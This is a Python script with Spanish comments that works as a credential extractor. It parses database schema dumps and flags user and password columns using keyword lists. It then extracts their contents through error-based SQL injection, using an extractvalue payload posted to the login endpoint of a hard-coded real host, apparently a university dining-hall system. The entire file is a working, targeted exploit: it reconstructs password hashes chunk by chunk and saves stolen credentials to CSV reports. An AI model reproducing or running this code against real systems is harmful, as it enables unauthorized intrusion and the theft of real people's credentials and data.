#!/usr/bin/env python3
"""
cred_extractor.py - Herramienta para buscar y extraer credenciales desde salidas de dbmap.
Modos:
  --analyze   : Escanea JSON(s) y genera un archivo de hallazgos.
  --extract   : Usa hallazgos (o analiza primero) para extraer datos vía SQLi.
"""

import os
import sys
import json
import csv
import argparse
import time
import re
from pathlib import Path
from typing import List, Dict, Optional
from datetime import datetime

import requests
import urllib3

# Desactivar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURACIÓN DEL TARGET ---
HOST_API = "comedor.uncp.edu.pe"
API_PATH = "/server"
TIMEOUT = 10
MAX_RETRIES = 3
DELAY = 0.3

# --- COLORES ANSI ---
class Colors:
    GREEN = '\033[0;32m'
    BLUE = '\033[0;34m'
    RED = '\033[0;31m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'

def log(msg: str) -> None:
    print(f"{Colors.BLUE}[*]{Colors.NC} {msg}")

def success(msg: str) -> None:
    print(f"{Colors.GREEN}[+]{Colors.NC} {msg}")

def error(msg: str) -> None:
    print(f"{Colors.RED}[!]{Colors.NC} {msg}", file=sys.stderr)

def warning(msg: str) -> None:
    print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")

# --- CLIENTE SQL INJECTION (ERROR-BASED) ---
class SQLiClient:
    def __init__(self, host: str = HOST_API, path: str = API_PATH,
                 timeout: int = TIMEOUT, max_retries: int = MAX_RETRIES,
                 delay: float = DELAY):
        self.url = f"https://{host}{path}/login.php"
        self.timeout = timeout
        self.max_retries = max_retries
        self.delay = delay
        self.session = requests.Session()

    def execute(self, query: str) -> Optional[str]:
        payload = f"' OR extractvalue(1, concat(0x7e, ({query}))) #"
        data = {"email": payload, "password": "any"}

        for attempt in range(self.max_retries):
            try:
                response = self.session.post(
                    self.url,
                    data={"data": json.dumps(data)},
                    headers={"Host": HOST_API},
                    timeout=self.timeout,
                    verify=False
                )
                match = re.search(r"XPATH syntax error: '~([^']+)'", response.text)
                if match:
                    return match.group(1)
            except Exception as e:
                if attempt == self.max_retries - 1:
                    error(f"Injection request failed: {e}")
                time.sleep(self.delay)
        return None

# --- PALABRAS CLAVE PARA DETECCIÓN ---
USER_KEYWORDS = [
    'user', 'username', 'login', 'email', 'usr', 'uid', 'uname', 'userid', 'user_id',
    'nick', 'nickname', 'alias', 'handle', 'identifier', 'ident', 'owner',
    'created_by', 'modified_by', 'author', 'operator', 'client', 'customer_id',
    'account', 'acct', 'profile', 'person', 'people', 'member',
    'usuario', 'usu', 'cuenta', 'correo', 'mail', 'registro', 'nombre_usuario',
    'nombre', 'apodo', 'creado_por', 'modificado_por', 'cliente',
    'login_id', 'signin', 'logon', 'user_name', 'user_login'
]

PASS_KEYWORDS = [
    'pass', 'password', 'pwd', 'pw', 'passwd', 'passcode', 'secret', 'hash',
    'pwhash', 'pass_hash', 'password_hash', 'encrypted', 'crypt', 'salt',
    'authentication_string', 'auth_token', 'token', 'pin', 'otp', 'otp_secret',
    'passphrase', 'phrase', 'credential', 'creds',
    'clave', 'contraseña', 'contra', 'secreto', 'hash_contraseña', 'contrasena',
    'password_encriptado', 'clave_acceso', 'pin_acceso',
    'user_pass', 'user_password', 'login_password', 'pwd_hash', 'pass_salt',
    'security_code', 'access_code', 'verification_code', 'two_factor'
]

TABLE_KEYWORDS = [
    'user', 'users', 'account', 'accounts', 'login', 'logins', 'member', 'members',
    'customer', 'customers', 'client', 'clients', 'admin', 'administrator',
    'administrators', 'auth', 'authentication', 'session', 'sessions', 'registro',
    'registration', 'signup', 'signon', 'person', 'persons', 'people', 'employee',
    'employees', 'staff', 'subscriber', 'subscribers',
    'usuario', 'usuarios', 'cuenta', 'cuentas', 'cliente', 'clientes', 'administrador',
    'administradores', 'sesion', 'sesiones', 'registro', 'registros', 'credenciales',
    'credencial', 'persona', 'personas', 'empleado', 'empleados',
    'tbl_user', 'tbl_users', 'user_data', 'user_info', 'user_details', 'user_account'
]

# --- ANALIZADOR DE JSON ---
class CredAnalyzer:
    def __init__(self):
        self.findings = []

    def analyze_path(self, path: str, db_filter: Optional[str] = None) -> List[Dict]:
        input_path = Path(path)
        if not input_path.exists():
            error(f"La ruta '{path}' no existe.")
            return []

        if input_path.is_file():
            json_files = [input_path]
        else:
            json_files = list(input_path.rglob("modelo_*.json"))
            if not json_files:
                error(f"No se encontraron archivos modelo_*.json en '{path}'")
                return []

        log(f"Analizando {len(json_files)} archivo(s) JSON...")
        self.findings = []
        for jf in json_files:
            try:
                with open(jf, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                db_name = data.get('database', jf.parent.name)
                if db_filter and db_name != db_filter:
                    continue
                for table in data.get('tables', []):
                    table_name = table.get('name', '')
                    columns = table.get('columns', [])
                    user_cols = []
                    pass_cols = []
                    for col in columns:
                        col_lower = col.get('name', '').lower()
                        if any(re.search(rf'\b{re.escape(kw)}\b', col_lower) for kw in USER_KEYWORDS):
                            user_cols.append(col.get('name'))
                        if any(re.search(rf'\b{re.escape(kw)}\b', col_lower) for kw in PASS_KEYWORDS):
                            pass_cols.append(col.get('name'))
                    table_lower = table_name.lower()
                    suspicious = any(kw in table_lower for kw in TABLE_KEYWORDS)
                    if user_cols or pass_cols or suspicious:
                        self.findings.append({
                            'database': db_name,
                            'table': table_name,
                            'user_columns': user_cols,
                            'password_columns': pass_cols,
                            'total_columns': len(columns),
                            'suspicious_table': suspicious,
                            'source_file': str(jf)
                        })
            except Exception as e:
                warning(f"Error procesando {jf}: {e}")
        return self.findings

    def print_summary(self):
        if not self.findings:
            warning("No se encontraron tablas candidatas.")
            return
        print(f"\n{Colors.CYAN}{'='*80}{Colors.NC}")
        print(f"{Colors.GREEN}Tablas candidatas encontradas: {len(self.findings)}{Colors.NC}")
        print(f"{Colors.CYAN}{'='*80}{Colors.NC}\n")
        for i, f in enumerate(self.findings, 1):
            print(f"{Colors.YELLOW}[{i}] {f['database']}.{f['table']}{Colors.NC}")
            if f['user_columns']:
                print(f"    User columns : {', '.join(f['user_columns'])}")
            if f['password_columns']:
                print(f"    Pass columns : {', '.join(f['password_columns'])}")
            if not f['user_columns'] and not f['password_columns'] and f['suspicious_table']:
                print(f"    (suspicious table by name)")
            print(f"    Source: {f['source_file']}")
            print()

    def save_findings(self, output_file: str):
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.findings, f, indent=2, ensure_ascii=False)
        success(f"Findings saved to: {output_file}")

    @staticmethod
    def load_findings(findings_file: str) -> List[Dict]:
        with open(findings_file, 'r', encoding='utf-8') as f:
            return json.load(f)

# --- EXTRACTOR VÍA SQLI ---
class CredExtractor:
    def __init__(self, sqli_client: SQLiClient):
        self.sqli = sqli_client

    def _extract_long_value(self, db: str, table: str, column: str, row_idx: int, max_length: int = 128) -> str:
        """
        Reconstruye un valor largo (ej. hash) mediante múltiples consultas SUBSTRING.
        """
        # Obtener longitud real del valor
        len_query = f"SELECT LENGTH(`{column}`) FROM `{db}`.`{table}` LIMIT {row_idx},1"
        len_res = self.sqli.execute(len_query)
        try:
            total_len = int(len_res) if len_res else 0
        except:
            total_len = 0

        if total_len == 0:
            return ""

        total_len = min(total_len, max_length)
        chunk_size = 30  # extractvalue devuelve ~32, usamos 30 para margen
        chunks = []

        for start in range(1, total_len + 1, chunk_size):
            length = min(chunk_size, total_len - start + 1)
            chunk_query = f"SELECT SUBSTRING(`{column}`, {start}, {length}) FROM `{db}`.`{table}` LIMIT {row_idx},1"
            chunk_res = self.sqli.execute(chunk_query)
            if chunk_res:
                chunks.append(chunk_res)
            else:
                chunks.append('?' * length)  # marcador en caso de fallo
            time.sleep(self.sqli.delay * 0.5)  # pausa entre fragmentos

        return ''.join(chunks)

    def extract_flat(self, findings: List[Dict],
                     db_filter: Optional[str] = None,
                     table_filter: Optional[str] = None,
                     output_dir: str = "extracted_creds",
                     max_rows: int = 50) -> str:
        """Formato plano: un solo CSV con metadatos (ahora con reconstrucción de hashes)."""
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        csv_file = os.path.join(output_dir, f"credentials_{timestamp}.csv")

        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Database', 'Table', 'Row', 'User_Columns', 'Password_Columns', 'Extracted_Data'])

            for item in findings:
                db = item['database']
                table = item['table']
                user_cols = item['user_columns']
                pass_cols = item['password_columns']

                if db_filter and db != db_filter:
                    continue
                if table_filter and table != table_filter:
                    continue

                cols_to_extract = user_cols + pass_cols
                if not cols_to_extract:
                    warning(f"Table {db}.{table} has no defined columns. Skipping.")
                    continue

                # Identificar columnas que pueden ser largas (hashes)
                long_cols = set(pass_cols)
                for col in cols_to_extract:
                    col_lower = col.lower()
                    if any(kw in col_lower for kw in ['hash', 'authentication', 'secret', 'token', 'password']):
                        long_cols.add(col)

                count_query = f"SELECT COUNT(*) FROM `{db}`.`{table}`"
                count_res = self.sqli.execute(count_query)
                try:
                    row_count = int(count_res) if count_res else 0
                except:
                    row_count = 0

                if row_count == 0:
                    log(f"Table {db}.{table} is empty.")
                    continue

                limit = min(row_count, max_rows)
                log(f"Extracting up to {limit} rows from {db}.{table}...")

                for row_idx in range(limit):
                    row_values = []
                    for col in cols_to_extract:
                        if col in long_cols:
                            val = self._extract_long_value(db, table, col, row_idx)
                        else:
                            query = f"SELECT IFNULL(`{col}`, 'NULL') FROM `{db}`.`{table}` LIMIT {row_idx},1"
                            val = self.sqli.execute(query)
                            if val is None:
                                val = ''
                        row_values.append(val)
                        time.sleep(self.sqli.delay * 0.3)

                    extracted_str = ' | '.join(row_values)
                    writer.writerow([db, table, row_idx,
                                     ", ".join(user_cols),
                                     ", ".join(pass_cols),
                                     extracted_str])
                    time.sleep(self.sqli.delay)

        success(f"Flat CSV saved to: {csv_file}")
        return csv_file
    
    def extract_structured(self, findings: List[Dict],
                           db_filter: Optional[str] = None,
                           table_filter: Optional[str] = None,
                           output_dir: str = "extracted_creds",
                           max_rows: int = 50) -> str:
        """Estructura profesional: carpeta por DB, CSV por tabla, con reconstrucción de hashes."""
        base_output = Path(output_dir)
        base_output.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        session_dir = base_output / f"extraction_{timestamp}"
        session_dir.mkdir(exist_ok=True)

        summary = {
            "extraction_time": datetime.now().isoformat(),
            "target_host": HOST_API,
            "total_databases": 0,
            "total_tables": 0,
            "total_rows_extracted": 0,
            "databases": {}
        }

        for item in findings:
            db = item['database']
            table = item['table']
            user_cols = item['user_columns']
            pass_cols = item['password_columns']

            if db_filter and db != db_filter:
                continue
            if table_filter and table != table_filter:
                continue

            cols_to_extract = user_cols + pass_cols
            if not cols_to_extract:
                warning(f"Table {db}.{table} has no columns to extract. Skipping.")
                continue

            db_dir = session_dir / db
            db_dir.mkdir(exist_ok=True)

            # Identificar columnas largas
            long_cols = set(pass_cols)
            for col in cols_to_extract:
                col_lower = col.lower()
                if any(kw in col_lower for kw in ['hash', 'authentication', 'secret', 'token', 'password']):
                    long_cols.add(col)

            count_query = f"SELECT COUNT(*) FROM `{db}`.`{table}`"
            count_res = self.sqli.execute(count_query)
            try:
                row_count = int(count_res) if count_res else 0
            except:
                row_count = 0

            if row_count == 0:
                log(f"Table {db}.{table} is empty.")
                continue

            limit = min(row_count, max_rows)
            log(f"Extracting up to {limit} rows from {db}.{table}...")

            csv_path = db_dir / f"{table}.csv"
            with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(cols_to_extract)

                for row_idx in range(limit):
                    row_values = []
                    for col in cols_to_extract:
                        if col in long_cols:
                            val = self._extract_long_value(db, table, col, row_idx)
                        else:
                            query = f"SELECT IFNULL(`{col}`, 'NULL') FROM `{db}`.`{table}` LIMIT {row_idx},1"
                            val = self.sqli.execute(query)
                            if val is None:
                                val = ''
                        row_values.append(val)
                        time.sleep(self.sqli.delay * 0.3)

                    writer.writerow(row_values)
                    time.sleep(self.sqli.delay)

            # Actualizar resumen
            if db not in summary["databases"]:
                summary["databases"][db] = {"tables": [], "total_rows": 0}
                summary["total_databases"] += 1
            summary["databases"][db]["tables"].append({
                "name": table,
                "rows_extracted": limit,
                "user_columns": user_cols,
                "password_columns": pass_cols,
                "csv_file": str(csv_path.relative_to(session_dir))
            })
            summary["databases"][db]["total_rows"] += limit
            summary["total_tables"] += 1
            summary["total_rows_extracted"] += limit

        # Guardar resumen JSON
        summary_path = session_dir / "extraction_summary.json"
        with open(summary_path, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

        # Crear README
        readme_path = session_dir / "README.txt"
        with open(readme_path, 'w', encoding='utf-8') as f:
            f.write("CREDENTIALS EXTRACTION REPORT\n")
            f.write("==============================\n")
            f.write(f"Extraction time : {summary['extraction_time']}\n")
            f.write(f"Target host     : {summary['target_host']}\n")
            f.write(f"Databases found : {summary['total_databases']}\n")
            f.write(f"Tables extracted: {summary['total_tables']}\n")
            f.write(f"Total rows      : {summary['total_rows_extracted']}\n\n")
            for db_name, db_info in summary["databases"].items():
                f.write(f"[{db_name}] - {db_info['total_rows']} rows\n")
                for tbl in db_info["tables"]:
                    f.write(f"  {tbl['name']}.csv ({tbl['rows_extracted']} rows)\n")
                    if tbl['user_columns']:
                        f.write(f"    User columns: {', '.join(tbl['user_columns'])}\n")
                    if tbl['password_columns']:
                        f.write(f"    Pass columns: {', '.join(tbl['password_columns'])}\n")
                f.write("\n")

        success(f"Extraction completed. Results in: {session_dir}")
        return str(session_dir)

# --- INTERFAZ DE LÍNEA DE COMANDOS ---
def main():
    parser = argparse.ArgumentParser(
        description="Buscador y extractor de credenciales desde salidas de dbmap",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modos de uso:
  --analyze   Solo analiza JSONs y genera archivo de hallazgos.
  --extract   Extrae datos vía SQLi usando hallazgos previos o analizando primero.

Ejemplos:
  %(prog)s --analyze -i output_20260101/ -o findings.json
  %(prog)s --analyze -i modelo_mysql.json --db mysql
  %(prog)s --extract -f findings.json --db mysql --table user
  %(prog)s --extract -i output_20260101/ --analyze-first --db mysql
        """
    )

    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--analyze", action="store_true", help="Modo análisis (solo lectura de JSONs)")
    mode_group.add_argument("--extract", action="store_true", help="Modo extracción (realiza consultas SQLi)")

    parser.add_argument("-i", "--input", metavar="PATH", help="Ruta a archivo JSON o directorio con salidas de dbmap")
    parser.add_argument("-o", "--output", metavar="FILE", help="(Modo analyze) Archivo donde guardar hallazgos JSON")
    parser.add_argument("--db", metavar="DB", help="Filtrar por nombre de base de datos")

    parser.add_argument("-f", "--findings", metavar="FILE", help="(Modo extract) Archivo de hallazgos JSON")
    parser.add_argument("--analyze-first", action="store_true", help="(Modo extract) Analizar primero el --input y luego extraer")
    parser.add_argument("--table", metavar="TABLE", help="(Modo extract) Extraer solo una tabla específica")
    parser.add_argument("--output-dir", default="extracted_creds", help="Directorio para guardar CSVs de extracción")
    parser.add_argument("--max-rows", type=int, default=50, help="Máximo de filas a extraer por tabla (default: 50)")
    parser.add_argument("--flat", action="store_true", help="Usar formato de salida plano (un solo CSV) en lugar de estructura por DB/tabla")

    args = parser.parse_args()

    if args.analyze and not args.input:
        error("Modo --analyze requiere --input")
        sys.exit(1)

    if args.extract:
        if not args.findings and not args.analyze_first:
            error("Modo --extract requiere --findings o --analyze-first (con --input)")
            sys.exit(1)
        if args.analyze_first and not args.input:
            error("--analyze-first requiere --input")
            sys.exit(1)

    # --- MODO ANÁLISIS ---
    if args.analyze:
        analyzer = CredAnalyzer()
        findings = analyzer.analyze_path(args.input, db_filter=args.db)
        analyzer.print_summary()
        if args.output:
            analyzer.save_findings(args.output)
        elif findings:
            resp = input("¿Desea guardar los hallazgos en un archivo? (s/N): ").strip().lower()
            if resp == 's':
                default_name = f"findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                analyzer.save_findings(default_name)
        sys.exit(0)

    # --- MODO EXTRACCIÓN ---
    if args.extract:
        print(f"{Colors.YELLOW}⚠️  ADVERTENCIA: La extracción realizará múltiples consultas SQLi.{Colors.NC}")
        print(f"Target: {HOST_API}{API_PATH}/login.php")
        resp = input("¿Estás seguro de continuar? (s/N): ").strip().lower()
        if resp != 's':
            sys.exit(0)

        sqli = SQLiClient()
        log("Cliente SQLi inicializado.")

        if args.analyze_first:
            analyzer = CredAnalyzer()
            findings = analyzer.analyze_path(args.input, db_filter=args.db)
            analyzer.print_summary()
            if not findings:
                error("No se encontraron tablas candidatas. Abortando.")
                sys.exit(1)
            resp = input("¿Guardar estos hallazgos en un archivo? (s/N): ").strip().lower()
            if resp == 's':
                fname = f"findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                analyzer.save_findings(fname)
        else:
            try:
                findings = CredAnalyzer.load_findings(args.findings)
            except Exception as e:
                error(f"No se pudo cargar el archivo de hallazgos: {e}")
                sys.exit(1)
            if args.db:
                findings = [f for f in findings if f['database'] == args.db]
            log(f"Hallazgos cargados: {len(findings)} tablas candidatas.")

        if not findings:
            warning("No hay tablas para extraer después de aplicar filtros.")
            sys.exit(0)

        extractor = CredExtractor(sqli)
        if args.flat:
            csv_path = extractor.extract_flat(
                findings,
                db_filter=args.db,
                table_filter=args.table,
                output_dir=args.output_dir,
                max_rows=args.max_rows
            )
        else:
            session_dir = extractor.extract_structured(
                findings,
                db_filter=args.db,
                table_filter=args.table,
                output_dir=args.output_dir,
                max_rows=args.max_rows
            )
            log(f"Reporte principal: {session_dir}/README.txt")
        sys.exit(0)

if __name__ == "__main__":
    main()